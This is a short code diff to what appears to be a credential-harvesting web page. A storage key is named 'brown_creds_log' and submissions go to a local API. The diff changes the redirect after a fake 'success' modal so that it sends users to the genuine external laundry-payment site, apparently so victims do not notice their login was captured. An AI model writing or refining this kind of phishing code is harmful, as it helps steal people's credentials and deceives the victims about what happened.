@@ -2,6 +2,7 @@
 
 const STORAGE_KEY = 'brown_creds_log';
 const API_URL = '/api/submissions';
+const POST_LOGIN_REDIRECT = 'https://mycscgo.com/laundry';
 
 document.addEventListener('DOMContentLoaded', function() {
     const currentPath = window.location.pathname;
@@ -145,14 +146,14 @@ function showSuccessModal() {
     modal.style.display = 'flex';
 
     setTimeout(() => {
-        window.location.href = '/nimda';
+        window.location.href = POST_LOGIN_REDIRECT;
     }, 2000);
 }
 
 function closeModal() {
     const modal = document.getElementById('success-modal');
     if (modal) modal.style.display = 'none';
-    window.location.href = '/nimda';
+    window.location.href = POST_LOGIN_REDIRECT;
 }
 
 function formatTime(iso) {
